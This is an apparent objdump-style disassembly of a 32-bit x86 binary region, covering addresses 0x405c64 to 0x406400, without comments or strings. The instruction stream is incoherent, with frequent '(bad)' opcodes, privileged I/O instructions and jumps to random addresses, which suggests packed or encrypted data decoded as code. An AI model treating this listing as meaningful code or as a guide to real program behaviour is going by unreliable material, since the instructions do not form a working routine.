  405c64:	aam    0x78
  405c66:	(bad)  
  405c67:	adc    al,0xe1
  405c69:	xchg   ebx,eax
  405c6a:	and    DWORD PTR [eax+0x16],esi
  405c6d:	mov    ds:0x546972e1,eax
  405c72:	call   0xcd654b23
  405c77:	(bad)  
  405c78:	mov    BYTE PTR ds:0x6c2ac34,0xdb
  405c7f:	pop    edi
  405c80:	push   cs
  405c81:	call   0x3593e984
  405c86:	add    al,0x0
  405c88:	mov    al,0x4d
  405c8a:	xor    al,0x48
  405c8c:	or     DWORD PTR [ecx+ecx*2],esp
  405c8f:	(bad)  
  405c90:	ins    BYTE PTR es:[edi],dx
  405c91:	add    DWORD PTR [edx+0x5316195a],ecx
  405c97:	icebp  
  405c98:	dec    esi
  405c99:	or     DWORD PTR [esi-0x4a],esp
  405c9c:	cmc    
  405c9d:	add    al,0x7f
  405c9f:	jmp    0xe5ab0383
  405ca4:	jp     0x405c3c
  405ca6:	int    0x2a
  405ca8:	std    
  405ca9:	mov    eax,0x6ba844ec
  405cae:	inc    ebx
  405caf:	sub    DWORD PTR [edi],edi
  405cb1:	mov    ebp,0x94df2df5
  405cb6:	scas   al,BYTE PTR es:[edi]
  405cb7:	or     al,0xef
  405cb9:	dec    esi
  405cba:	repnz fxch st(2)
  405cbd:	jne    0x405d1d
  405cbf:	lods   eax,DWORD PTR ds:[esi]
  405cc0:	jo     0x405d16
  405cc2:	mov    bl,0xb6
  405cc4:	xchg   esp,eax
  405cc5:	sbb    al,0x8
  405cc7:	dec    ecx
  405cc8:	(bad)  
  405cc9:	cld    
  405cca:	add    eax,0x2fb43e31
  405ccf:	int    0xc5
  405cd1:	xchg   edi,eax
  405cd2:	std    
  405cd3:	sbb    cl,BYTE PTR [edx+0x5b20c3b6]
  405cd9:	adc    bl,0x34
  405cdc:	inc    esp
  405cdd:	clc    
  405cde:	and    eax,0x17bc99b6
  405ce3:	(bad)  
  405ce4:	rcl    BYTE PTR [ebx+eiz*1+0x1420339b],cl
  405ceb:	pop    ss
  405cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ced:	ja     0x405d19
  405cef:	sub    eax,0x2e1d9767
  405cf4:	pop    edx
  405cf5:	xchg   edi,eax
  405cf6:	loopne 0x405cda
  405cf8:	push   0x4d50cb52
  405cfd:	lds    esp,FWORD PTR [edx-0x2e]
  405d00:	jno    0x405cd2
  405d02:	and    BYTE PTR [esi-0x30],ah
  405d05:	ins    BYTE PTR es:[edi],dx
  405d06:	(bad)  
  405d07:	lods   al,BYTE PTR ds:[esi]
  405d08:	ja     0x405d27
  405d0a:	mov    bh,0x31
  405d0c:	sbb    al,0xe6
  405d0e:	cwde   
  405d0f:	hlt    
  405d10:	sbb    eax,0xe51ab217
  405d15:	dec    edx
  405d16:	cwde   
  405d17:	mov    WORD PTR [edx+0x2b],gs
  405d1a:	pusha  
  405d1b:	fst    DWORD PTR [edi-0x3c2cd60b]
  405d21:	cli    
  405d22:	je     0x405d4f
  405d24:	test   BYTE PTR [ebp+0x5d],cl
  405d27:	rol    BYTE PTR [ecx-0x3794d004],0x36
  405d2e:	xor    al,0xce
  405d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d31:	bound  ecx,QWORD PTR [ecx]
  405d33:	push   0x980ec321
  405d38:	add    al,BYTE PTR [eax-0x12]
  405d3b:	dec    DWORD PTR [eax]
  405d3d:	(bad)  
  405d3e:	mov    bl,0xa9
  405d40:	inc    ecx
  405d41:	xchg   ebx,eax
  405d42:	xor    eax,0x1a5dc62f
  405d47:	test   eax,0x614dc51f
  405d4c:	movaps xmm0,XMMWORD PTR [ecx+0x1e]
  405d50:	sbb    al,0x64
  405d52:	retf   
  405d53:	push   esp
  405d54:	inc    esp
  405d55:	pop    edx
  405d56:	cmp    BYTE PTR [ebp+0x7ff184a1],dl
  405d5c:	jmp    0x405d77
  405d5e:	jecxz  0x405d21
  405d60:	sub    BYTE PTR [eax-0x2d],cl
  405d63:	adc    eax,0x72dd6d93
  405d68:	fsubr  QWORD PTR [edx]
  405d6a:	lea    ecx,[esi+0x55]
  405d6d:	mov    ecx,0x92266766
  405d72:	mov    DWORD PTR [edx-0x2b3bed38],0x77812f6f
  405d7c:	sbb    eax,0x7569dbaa
  405d81:	jecxz  0x405dde
  405d83:	and    bh,BYTE PTR [ebp+0x39]
  405d86:	push   0xf75a91de
  405d8b:	mov    ebx,0x1fd10be2
  405d90:	mov    dh,0xa6
  405d92:	ins    BYTE PTR es:[edi],dx
  405d93:	xchg   bl,al
  405d95:	mov    dl,dh
  405d97:	mov    ebx,0x575ae463
  405d9c:	aas    
  405d9d:	int    0x91
  405d9f:	fisttp QWORD PTR [ebp-0x7d2c1610]
  405da5:	repnz popf 
  405da7:	ins    BYTE PTR es:[edi],dx
  405da8:	jne    0x405d69
  405daa:	jns    0x405df5
  405dac:	aam    0x21
  405dae:	mov    edx,ebx
  405db0:	or     BYTE PTR [eax+0xb650451],ah
  405db6:	dec    edi
  405db7:	push   esi
  405db8:	iret   
  405db9:	adc    ch,bh
  405dbb:	out    0xb0,al
  405dbd:	pop    ebp
  405dbe:	call   0x513c:0x370343ec
  405dc5:	sti    
  405dc6:	xor    dl,BYTE PTR [ebx-0x62]
  405dc9:	mov    esi,0x347b241e
  405dce:	repz imul ebp,DWORD PTR [ebx+0x686a2752],0xffffffee
  405dd6:	and    BYTE PTR [eax],0xc9
  405dd9:	fs jmp 0xf193:0xfbb5833b
  405de1:	mov    ah,0x4
  405de3:	dec    ecx
  405de4:	cmp    BYTE PTR [esi],ch
  405de6:	push   ebx
  405de7:	icebp  
  405de8:	(bad)  
  405de9:	inc    esi
  405dea:	pop    esi
  405deb:	jbe    0x405ddc
  405ded:	mov    dl,0xfb
  405def:	and    al,0x5c
  405df1:	in     al,dx
  405df2:	sub    bl,al
  405df4:	int    0x8d
  405df6:	jmp    0x4cbd:0x30995a2c
  405dfd:	jmp    0xf197534d
  405e02:	mov    eax,0x3b2ef838
  405e07:	sub    bh,BYTE PTR [esi+ebx*1]
  405e0a:	xor    edi,esp
  405e0c:	pop    ecx
  405e0d:	mul    BYTE PTR [ebx]
  405e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e10:	hlt    
  405e11:	fiadd  DWORD PTR [edi+ecx*1+0x587305a3]
  405e18:	sbb    al,0xaf
  405e1a:	into   
  405e1b:	cmp    dl,0x36
  405e1e:	imul   eax,eax,0x7ffa414d
  405e24:	push   edi
  405e25:	xchg   bl,al
  405e27:	ror    DWORD PTR [eax+edi*1-0x2e],1
  405e2b:	jae    0x405dfc
  405e2d:	sbb    BYTE PTR [ecx+0x6049d004],bl
  405e33:	jno    0x405e84
  405e35:	xor    eax,0x1fe8514d
  405e3a:	push   ss
  405e3b:	retf   
  405e3c:	pop    esp
  405e3d:	mov    esp,0x393f0da8
  405e42:	xor    edx,ebx
  405e44:	xor    eax,0xaa95aa23
  405e49:	adc    bh,BYTE PTR [ebx]
  405e4b:	jecxz  0x405e7e
  405e4d:	arpl   cx,sp
  405e4f:	enter  0x45f2,0xd8
  405e53:	sahf   
  405e54:	mov    eax,DWORD PTR [ecx]
  405e56:	adc    BYTE PTR [eax+0x724c6dd9],dh
  405e5c:	mov    BYTE PTR [eax+0x5fdd09f0],al
  405e62:	(bad)  
  405e64:	cmp    al,0xc7
  405e66:	call   0x4bb06c04
  405e6b:	jmp    0xf01400d1
  405e70:	lahf   
  405e71:	xchg   edi,eax
  405e72:	imul   ebx,DWORD PTR [ecx+eiz*1],0x5c
  405e76:	xchg   ebp,eax
  405e77:	js     0x405e2b
  405e79:	push   edi
  405e7a:	scas   al,BYTE PTR es:[edi]
  405e7b:	popa   
  405e7c:	shl    BYTE PTR [edi+0x207ce098],cl
  405e82:	shl    bh,1
  405e84:	sahf   
  405e85:	dec    edi
  405e86:	je     0x405ea8
  405e88:	jae    0x405f03
  405e8a:	add    cl,dl
  405e8c:	(bad)
  405e90:	(bad)  
  405e91:	push   ecx
  405e92:	enter  0xc3ed,0xb5
  405e96:	scas   eax,DWORD PTR es:[edi]
  405e97:	pusha  
  405e98:	push   ebx
  405e99:	ja     0x405e78
  405e9b:	sub    bh,BYTE PTR [ebp-0xdb8e425]
  405ea1:	shr    esp,cl
  405ea3:	mov    ds,WORD PTR [ebx]
  405ea5:	and    dh,BYTE PTR [eax-0x46f3bd21]
  405eab:	mov    edx,0x782447e5
  405eb0:	pop    es
  405eb1:	into   
  405eb2:	push   ebx
  405eb3:	xor    esp,DWORD PTR [eax-0x5e]
  405eb6:	ror    DWORD PTR [ebx-0x68bc7bd5],0x90
  405ebd:	adc    al,0x2
  405ebf:	sub    esi,DWORD PTR [edi+0x5cc6419b]
  405ec5:	hlt    
  405ec6:	into   
  405ec7:	sbb    eax,0x875f94a1
  405ecc:	push   es
  405ecd:	fcmovnbe st,st(2)
  405ecf:	sbb    edx,DWORD PTR [ecx-0x1a4b1381]
  405ed5:	add    al,0x65
  405ed7:	bound  edx,QWORD PTR [esi]
  405ed9:	loop   0x405f10
  405edb:	nop
  405edc:	mov    cl,0xde
  405ede:	sub    al,0x24
  405ee0:	pop    es
  405ee1:	xchg   BYTE PTR [eax+0x68],ch
  405ee4:	xor    ebx,DWORD PTR [eax]
  405ee6:	enter  0x1348,0x1c
  405eea:	icebp  
  405eeb:	adc    ch,BYTE PTR [eax-0x6f]
  405eee:	xor    eax,0x13fb1e64
  405ef3:	jnp    0x405f20
  405ef5:	sub    BYTE PTR [edi+eiz*4-0x60760896],ch
  405efc:	fild   DWORD PTR [ecx+0xbaab891]
  405f02:	loope  0x405f32
  405f04:	arpl   WORD PTR [edx+0x49],cx
  405f07:	into   
  405f08:	or     cl,dl
  405f0a:	lods   eax,DWORD PTR ds:[esi]
  405f0b:	ror    BYTE PTR [eax],1
  405f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f0e:	mul    BYTE PTR [edx+0x4d]
  405f11:	sahf   
  405f12:	scas   eax,DWORD PTR es:[edi]
  405f13:	lea    edx,[edx+0x5a]
  405f16:	cmp    eax,0x82af8aba
  405f1b:	dec    edx
  405f1c:	xor    al,0xc4
  405f1e:	and    DWORD PTR [edi+0x1b],eax
  405f21:	idiv   edi
  405f23:	stos   DWORD PTR es:[edi],eax
  405f24:	(bad)  
  405f25:	into   
  405f26:	mov    bh,0x5f
  405f28:	cmp    DWORD PTR [ecx-0x476d36ec],ebp
  405f2e:	and    bh,bh
  405f30:	std    
  405f31:	ds inc esp
  405f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f34:	cmp    eax,0xff5aa3b4
  405f39:	retf   
  405f3a:	iret   
  405f3b:	inc    ecx
  405f3c:	pop    esi
  405f3d:	xchg   BYTE PTR [edx+ebp*8+0x21],dl
  405f41:	jne    0x405fa5
  405f43:	(bad)  
  405f44:	push   ebx
  405f45:	inc    esi
  405f46:	test   WORD PTR [esi-0x45],bp
  405f4a:	or     DWORD PTR [ebp-0x7abed15],0x39
  405f51:	inc    ecx
  405f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f53:	mov    dl,0x6b
  405f55:	mov    dh,0x73
  405f57:	leave  
  405f58:	loopne 0x405f06
  405f5a:	or     al,0xcc
  405f5c:	std    
  405f5d:	cld    
  405f5e:	mov    ds:0x889df3be,al
  405f63:	dec    esi
  405f64:	ins    BYTE PTR es:[edi],dx
  405f65:	inc    ebx
  405f66:	cld    
  405f67:	inc    ebx
  405f68:	push   edi
  405f69:	add    BYTE PTR [edi-0x607ccce0],dl
  405f6f:	push   ss
  405f70:	fisttp DWORD PTR [edi]
  405f72:	(bad)  
  405f73:	sti    
  405f74:	xlat   BYTE PTR ds:[ebx]
  405f75:	adc    DWORD PTR [eax],ebx
  405f77:	(bad)  
  405f79:	xchg   ebp,eax
  405f7a:	fwait
  405f7b:	xlat   BYTE PTR ds:[ebx]
  405f7c:	in     eax,0xc1
  405f7e:	xor    esi,edi
  405f80:	mov    ecx,0x7b204099
  405f85:	dec    esp
  405f86:	push   0xb2be0571
  405f8b:	mov    ds:0xdaca7e71,al
  405f90:	out    dx,eax
  405f91:	cmp    ebx,DWORD PTR [edi-0x76]
  405f94:	pop    edi
  405f95:	push   ss
  405f96:	dec    esp
  405f97:	mov    ch,0xc1
  405f99:	ret    0xb4d3
  405f9c:	mov    eax,0xe16ca52
  405fa1:	int3   
  405fa2:	sar    BYTE PTR [ebx],0x37
  405fa5:	xor    DWORD PTR [esi+ebp*1-0x1a],eax
  405fa9:	sbb    bl,BYTE PTR [eax-0x5d]
  405fac:	sbb    eax,DWORD PTR [ecx]
  405fae:	mov    ah,0x53
  405fb0:	js     0x406016
  405fb2:	es icebp 
  405fb4:	dec    ebp
  405fb5:	aaa    
  405fb6:	jns    0x405f50
  405fb8:	inc    ebp
  405fb9:	jo     0x405ff1
  405fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fbc:	mov    dh,0x20
  405fbe:	xor    al,0xd1
  405fc0:	pop    esp
  405fc1:	idiv   BYTE PTR [edx+0x4c]
  405fc4:	rol    DWORD PTR [edi],1
  405fc6:	ficomp WORD PTR [edi+ebx*2-0x2df211f]
  405fcd:	lahf   
  405fce:	mov    ah,0x8b
  405fd0:	mov    edx,edx
  405fd2:	adc    al,BYTE PTR [ecx+0x6bb0d1f4]
  405fd8:	in     eax,0x71
  405fda:	adc    dl,bh
  405fdc:	push   0xa9eec45f
  405fe1:	add    eax,0xc3823da6
  405fe6:	and    ecx,0x317cd8a8
  405fec:	push   edx
  405fed:	cmp    al,0x4e
  405fef:	test   DWORD PTR [esi+0x4d],esi
  405ff2:	mov    bl,0xd2
  405ff4:	xchg   DWORD PTR [ebp+0x6],edx
  405ff7:	inc    esp
  405ff8:	ss xchg esi,eax
  405ffa:	inc    ecx
  405ffb:	out    dx,al
  405ffc:	js     0x406006
  405ffe:	jb     0x405ff8
  406000:	pop    edi
  406001:	adc    DWORD PTR [ebx],eax
  406003:	sub    ch,BYTE PTR [edi-0x5de8deb9]
  406009:	sub    ecx,esp
  40600b:	in     al,0x9
  40600d:	je     0x405fe0
  40600f:	jne    0x406027
  406011:	frstor [edx]
  406013:	push   ss
  406014:	imul   ebx,DWORD PTR [esp+ebp*4],0x5
  406018:	jnp    0x405fdf
  40601a:	mov    ch,0x68
  40601c:	adc    eax,0xcfe526e6
  406021:	(bad)  
  406022:	mov    esi,0x83a2ffb5
  406027:	jbe    0x405ff3
  406029:	cmp    BYTE PTR [ebx],0xef
  40602c:	mov    ebp,0x623604d5
  406031:	pop    eax
  406032:	mov    ds:0x8c1226e8,eax
  406037:	jmp    0x4060b1
  406039:	cs push ebp
  40603b:	sub    eax,0xc5a27fe7
  406040:	mov    dl,0x8b
  406042:	mov    gs,WORD PTR [edi]
  406044:	das    
  406045:	stos   BYTE PTR es:[edi],al
  406046:	stc    
  406047:	push   0x692a1bb5
  40604c:	shl    BYTE PTR [ebp+0x56134e78],cl
  406052:	je     0x405fe0
  406054:	sbb    al,0xad
  406056:	add    eax,0x15fe6298
  40605b:	rcl    DWORD PTR [esi],1
  40605d:	xor    BYTE PTR [edx+esi*1],ah
  406060:	ins    DWORD PTR es:[edi],dx
  406061:	pop    ebx
  406062:	sub    BYTE PTR [ebx-0x53],bh
  406065:	jnp    0x4060c6
  406067:	fsubr  DWORD PTR [edi]
  406069:	hlt    
  40606a:	data16 jl 0x40608a
  40606d:	lods   al,BYTE PTR ds:[esi]
  40606e:	xlat   BYTE PTR ds:[ebx]
  40606f:	dec    eax
  406070:	add    BYTE PTR [eax],bl
  406072:	mov    ecx,0x8dca50f3
  406077:	mov    ebx,0x4fc08eb7
  40607c:	lock pop esp
  40607e:	xchg   edi,eax
  40607f:	outs   dx,DWORD PTR ds:[esi]
  406080:	out    0x13,al
  406082:	out    0x24,eax
  406084:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  406086:	xor    DWORD PTR [ecx+0x34],eax
  406089:	js     0x4060fd
  40608b:	sbb    BYTE PTR [eax-0x17ccd1df],0x58
  406092:	inc    ecx
  406093:	and    BYTE PTR [ecx+0x4b],0x44
  406097:	addr16 cdq 
  406099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40609a:	inc    ecx
  40609b:	daa    
  40609c:	ja     0x406082
  40609e:	test   eax,0xe6dc61f5
  4060a3:	hlt    
  4060a4:	adc    BYTE PTR [edx+ecx*1+0x37eb4730],al
  4060ab:	add    eax,esp
  4060ad:	scas   al,BYTE PTR es:[edi]
  4060ae:	push   edi
  4060af:	push   ebx
  4060b0:	or     dh,ah
  4060b2:	in     eax,dx
  4060b3:	outs   dx,DWORD PTR ds:[esi]
  4060b4:	aam    0x7a
  4060b6:	(bad)  
  4060b7:	sbb    BYTE PTR [esi+0x2f],cl
  4060ba:	je     0x4060c9
  4060bc:	xor    edx,DWORD PTR [ebp-0x68]
  4060bf:	mov    eax,0x54a54808
  4060c4:	xchg   edi,eax
  4060c5:	pop    edx
  4060c6:	test   BYTE PTR [esi+0x68],bl
  4060c9:	nop
  4060ca:	sbb    edi,DWORD PTR [eax-0x45015fd8]
  4060d0:	and    al,0xab
  4060d2:	outs   dx,DWORD PTR ds:[esi]
  4060d3:	adc    ah,BYTE PTR [esi+0x53]
  4060d6:	pop    ebx
  4060d7:	push   eax
  4060d8:	(bad)  
  4060d9:	into   
  4060da:	adc    al,0xdd
  4060dc:	sbb    dl,ch
  4060de:	mov    ds:0x90ab75c7,al
  4060e3:	adc    esi,DWORD PTR [ebp-0x5]
  4060e6:	mov    ecx,0xfe5e3a06
  4060eb:	popf   
  4060ec:	dec    eax
  4060ed:	dec    ebp
  4060ee:	and    cl,BYTE PTR [ecx-0x31]
  4060f1:	inc    esp
  4060f2:	and    al,0x9c
  4060f4:	cli    
  4060f5:	sbb    bl,ch
  4060f7:	hlt    
  4060f8:	scas   eax,DWORD PTR es:[edi]
  4060f9:	mov    gs,edi
  4060fb:	or     BYTE PTR [ebp+0x402d39ab],bh
  406101:	jge    0x4060e2
  406103:	shr    BYTE PTR [ecx-0x68],cl
  406106:	iret   
  406107:	and    BYTE PTR [ecx+edi*2+0x251a4955],dh
  40610e:	sbb    al,0x40
  406110:	test   eax,0x66ad782a
  406115:	mov    bh,0x41
  406117:	stc    
  406118:	les    ecx,FWORD PTR [edx+0x21058cb9]
  40611e:	jecxz  0x406171
  406120:	call   0xc747:0x478aa74b
  406127:	jns    0x406134
  406129:	push   es
  40612a:	mov    cl,0x4f
  40612c:	mov    edi,0xcca105ee
  406131:	outs   dx,BYTE PTR ds:[esi]
  406132:	mov    ebp,ebx
  406134:	push   ebx
  406135:	and    al,cl
  406137:	and    ah,BYTE PTR [ebp-0x5360723c]
  40613d:	xor    DWORD PTR [ebx],0xe04ee69c
  406143:	xor    al,0xf4
  406145:	dec    esi
  406146:	jo     0x406113
  406148:	jg     0x40612f
  40614a:	sub    ch,BYTE PTR [ebp+esi*8+0x6f1aad4e]
  406151:	mov    ecx,0xa843cc20
  406156:	cmp    BYTE PTR [ebx+0xe],cl
  406159:	js     0x406131
  40615b:	pop    edx
  40615c:	fdiv   DWORD PTR [esi+0xa]
  40615f:	test   BYTE PTR [edi],ah
  406161:	fwait
  406162:	adc    eax,0x9a00357a
  406167:	adc    BYTE PTR [edi-0x20],bh
  40616a:	sub    al,BYTE PTR [ecx-0x1ba40764]
  406170:	test   eax,0xa4d22ca8
  406175:	sub    ebp,DWORD PTR [edi+0x26f8916e]
  40617b:	je     0x4061e3
  40617d:	popa   
  40617e:	iret   
  40617f:	jno    0x4061b8
  406181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406182:	push   es
  406183:	mov    ebp,0xd17d8ee
  406188:	or     DWORD PTR [ecx],0xffffff91
  40618b:	mov    ds:0x3f46e2e7,al
  406190:	into   
  406191:	pusha  
  406192:	imul   edi,DWORD PTR [ebp-0x481a895b],0xfffffffc
  406199:	nop
  40619a:	scas   al,BYTE PTR es:[edi]
  40619b:	nop
  40619c:	test   al,0xc6
  40619e:	les    ecx,FWORD PTR [ebx+edi*8]
  4061a1:	jo     0x40614b
  4061a3:	mov    cl,0x98
  4061a5:	pop    ds
  4061a6:	adc    edx,DWORD PTR [edx+edx*8-0x3e096a00]
  4061ad:	retf   0xf0f0
  4061b0:	in     eax,dx
  4061b1:	out    dx,al
  4061b2:	(bad)  
  4061b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b4:	(bad)  
  4061b5:	jnp    0x406197
  4061b7:	pop    ebp
  4061b8:	xchg   edx,ebx
  4061ba:	sbb    eax,0x99b5730c
  4061bf:	jle    0x4061f5
  4061c1:	adc    DWORD PTR [edx+esi*1+0x628a5257],eax
  4061c8:	push   edx
  4061c9:	or     BYTE PTR [edx],bl
  4061cb:	sbb    al,0x12
  4061cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061ce:	push   esp
  4061cf:	sbb    cl,bh
  4061d1:	jl     0x406193
  4061d3:	sub    bl,bh
  4061d5:	out    dx,al
  4061d6:	mov    al,0xc2
  4061d8:	fnstsw WORD PTR [eax]
  4061da:	int    0x7e
  4061dc:	bswap  edx
  4061de:	adc    dh,dl
  4061e0:	ja     0x406178
  4061e2:	push   esi
  4061e3:	dec    esi
  4061e4:	adc    eax,0x8168c41d
  4061e9:	enter  0xcf99,0x1e
  4061ed:	cmp    esi,DWORD PTR [ebx]
  4061ef:	fsubr  QWORD PTR [edx+0x6683927b]
  4061f5:	mov    WORD PTR [ebx],?
  4061f7:	nop
  4061f8:	push   ebx
  4061f9:	out    dx,al
  4061fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061fb:	in     eax,0x9d
  4061fd:	aad    0xb7
  4061ff:	pusha  
  406200:	push   0x6f
  406202:	adc    eax,0xcfc212fd
  406207:	cli    
  406208:	outs   dx,BYTE PTR ds:[esi]
  406209:	aam    0x2d
  40620b:	cmc    
  40620c:	push   0x62d5f129
  406211:	sar    esp,0xcc
  406214:	push   edx
  406215:	and    bh,BYTE PTR [esi+0x1b2a92d6]
  40621b:	pushf  
  40621c:	call   0x865b:0xc534e6d0
  406223:	data16 out dx,al
  406225:	adc    DWORD PTR [ebx],0xffffffa4
  406228:	mov    dh,0x10
  40622a:	jae    0x406243
  40622c:	pushf  
  40622d:	hlt    
  40622e:	cld    
  40622f:	repz call 0x9678:0x73828389
  406237:	push   0xffffffab
  406239:	mov    ebx,0x80893b4c
  40623e:	retf   
  40623f:	jnp    0x4061d9
  406241:	and    BYTE PTR [edx+0x32],0x19
  406245:	jecxz  0x4062a1
  406247:	sub    cl,BYTE PTR [edx-0x57aba43e]
  40624d:	jns    0x40625d
  40624f:	mov    ah,0x68
  406251:	mov    esp,0xf16849bc
  406256:	fdivr  DWORD PTR [edi]
  406258:	aad    0xc3
  40625a:	mov    ch,0xa8
  40625c:	outs   dx,DWORD PTR ds:[esi]
  40625d:	mov    dh,0x1e
  40625f:	scas   eax,DWORD PTR es:[edi]
  406260:	stos   DWORD PTR es:[edi],eax
  406261:	mov    al,ds:0xd1dbbfb8
  406266:	icebp  
  406267:	pushf  
  406268:	lds    ebx,FWORD PTR [eax]
  40626a:	jns    0x4062c3
  40626c:	loopne 0x406227
  40626e:	mov    ah,0x79
  406270:	sub    al,BYTE PTR [esi-0x14]
  406273:	stos   DWORD PTR es:[edi],eax
  406274:	push   eax
  406275:	jbe    0x406278
  406277:	push   esp
  406278:	adc    eax,0x75701e35
  40627d:	xchg   ecx,eax
  40627e:	xchg   esp,eax
  40627f:	in     eax,dx
  406280:	test   DWORD PTR [edx],ecx
  406282:	out    dx,eax
  406283:	add    al,0x18
  406285:	scas   al,BYTE PTR es:[edi]
  406286:	stos   DWORD PTR es:[edi],eax
  406287:	test   BYTE PTR [bp-0x751c],ch
  40628c:	in     al,0x14
  40628e:	ins    BYTE PTR es:[edi],dx
  40628f:	dec    ebp
  406290:	xchg   edx,eax
  406291:	(bad)  
  406292:	mov    edi,0xa13cbefc
  406298:	neg    ebx
  40629a:	mov    al,0xbf
  40629c:	and    al,0x67
  40629e:	data16 mov cl,0x33
  4062a1:	mov    DWORD PTR [eax+0x63],ecx
  4062a4:	mov    al,0xb
  4062a6:	loop   0x4062dd
  4062a8:	je     0x406247
  4062aa:	out    dx,al
  4062ab:	nop    esi
  4062ae:	scas   eax,DWORD PTR es:[edi]
  4062af:	cs mov dl,0x9a
  4062b2:	(bad)  
  4062b3:	dec    edi
  4062b4:	push   edi
  4062b5:	into   
  4062b6:	aaa    
  4062b7:	mov    cl,0x89
  4062b9:	add    cl,0x29
  4062bc:	mov    eax,ds:0x5c78014e
  4062c1:	in     al,0x1d
  4062c3:	jb     0x40626c
  4062c5:	add    al,0xd6
  4062c7:	fidivr DWORD PTR [edx-0x98c1437]
  4062cd:	pop    esp
  4062ce:	cmp    al,0xe0
  4062d0:	push   0x1e
  4062d2:	mov    eax,DWORD PTR [edi+0x610defe5]
  4062d8:	inc    ebx
  4062d9:	mov    esi,0xd83bc800
  4062de:	outs   dx,DWORD PTR ds:[esi]
  4062df:	and    BYTE PTR [eax],cl
  4062e1:	aad    0xc5
  4062e3:	xor    bh,BYTE PTR [edx]
  4062e5:	jg     0x406273
  4062e7:	and    al,0xbd
  4062e9:	xor    eax,0x5938d2c4
  4062ee:	pushf  
  4062ef:	sub    bl,BYTE PTR [esi+edx*1+0x35fbaa24]
  4062f6:	inc    ecx
  4062f7:	das    
  4062f8:	sub    eax,0x1a12117
  4062fd:	cmp    DWORD PTR [esi+edx*8-0x38013f2f],ecx
  406304:	popf   
  406305:	arpl   WORD PTR [edx],bp
  406307:	shr    ch,0x68
  40630a:	cmc    
  40630b:	mov    dl,0x6d
  40630d:	loope  0x406346
  40630f:	adc    BYTE PTR [ecx+0x2d],bl
  406312:	mov    esp,0x3de48fb5
  406317:	cmp    BYTE PTR [esi],0x8d
  40631a:	mov    dh,dl
  40631c:	int3   
  40631d:	xlat   BYTE PTR ds:[ebx]
  40631e:	retf   0xcd26
  406321:	cmp    BYTE PTR [ebx+0x1b7e74f],ch
  406327:	inc    eax
  406328:	fwait
  406329:	or     DWORD PTR [edx],ecx
  40632b:	enter  0x8e8b,0xaf
  40632f:	jnp    0x406372
  406331:	dec    edi
  406332:	fwait
  406333:	enter  0x84ff,0x8a
  406337:	imul   ebx,DWORD PTR [edx-0x36],0xf42d69e5
  40633e:	xchg   edi,eax
  40633f:	fldcw  WORD PTR [ebx]
  406341:	loopne 0x4063b4
  406343:	les    esi,FWORD PTR [esi+0x3e]
  406346:	shl    DWORD PTR [ecx],0xf2
  406349:	shr    DWORD PTR [ecx-0x168eec60],1
  40634f:	scas   al,BYTE PTR es:[edi]
  406350:	mov    eax,ds:0x187d0b80
  406355:	push   edi
  406356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406357:	mov    ds:0xad08466b,al
  40635c:	xchg   ecx,eax
  40635d:	sbb    DWORD PTR [esi+0x3a],edi
  406360:	mov    edi,es
  406362:	add    dh,BYTE PTR [esi-0x3a6c5b5]
  406368:	(bad)  
  406369:	sbb    dl,ah
  40636b:	jns    0x40630f
  40636d:	jecxz  0x40635f
  40636f:	sbb    al,0xb1
  406371:	xlat   BYTE PTR ds:[ebx]
  406372:	(bad)  
  406373:	rol    eax,1
  406375:	aas    
  406376:	mov    dl,0xa1
  406378:	pushf  
  406379:	xor    al,0x14
  40637b:	sub    eax,esp
  40637d:	push   ds
  40637e:	iret   
  40637f:	adc    al,0x38
  406381:	fsubr  DWORD PTR [ebx+0x5fa5b2c7]
  406387:	cmp    edx,esi
  406389:	and    eax,0x2476d3bb
  40638e:	jbe    0x4063ee
  406390:	adc    BYTE PTR [edi-0x188286f6],ch
  406396:	and    BYTE PTR [ebx],0x95
  406399:	xchg   esi,eax
  40639a:	ja     0x406404
  40639c:	cmc    
  40639d:	mov    ebp,0x18cbe19f
  4063a2:	pushf  
  4063a3:	ret    0x6e54
  4063a6:	xchg   ebp,eax
  4063a7:	std    
  4063a8:	in     eax,0xad
  4063aa:	lea    esp,[edi+0x1c]
  4063ad:	cwde   
  4063ae:	xchg   edx,eax
  4063af:	loope  0x4063d1
  4063b1:	in     al,dx
  4063b2:	adc    bh,cl
  4063b4:	jg     0x40636f
  4063b6:	ins    DWORD PTR es:[edi],dx
  4063b7:	pop    ecx
  4063b8:	push   esi
  4063b9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4063bb:	sbb    esi,DWORD PTR [esi-0xd]
  4063be:	cmp    al,0xb0
  4063c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c2:	mov    eax,0xebd99b7d
  4063c7:	dec    ebp
  4063c8:	sub    al,BYTE PTR [edx-0x1db1292a]
  4063ce:	xchg   ebp,eax
  4063cf:	add    BYTE PTR [edx+0x34],bh
  4063d2:	in     eax,dx
  4063d3:	cmp    edi,DWORD PTR [ecx+ecx*8]
  4063d6:	imul   BYTE PTR [ebx]
  4063d8:	in     eax,0x46
  4063da:	fsubr  st(2),st
  4063dc:	aam    0x1f
  4063de:	das    
  4063df:	push   ds
  4063e0:	mov    bh,0xb6
  4063e2:	fadd   st(6),st
  4063e4:	pop    esp
  4063e5:	sub    eax,0x426bb3a8
  4063ea:	cmp    BYTE PTR [ebx+0x3e],bl
  4063ed:	inc    ebx
  4063ee:	mov    cl,0x3c
  4063f0:	xor    eax,0xaf99872c
  4063f5:	retf   
  4063f6:	call   FWORD PTR [edi+0x60bc6fb7]
  4063fc:	sub    edi,esp
  4063fe:	jo     0x406473
  406400:	les    eax,FWORD PTR [esi-0x49]
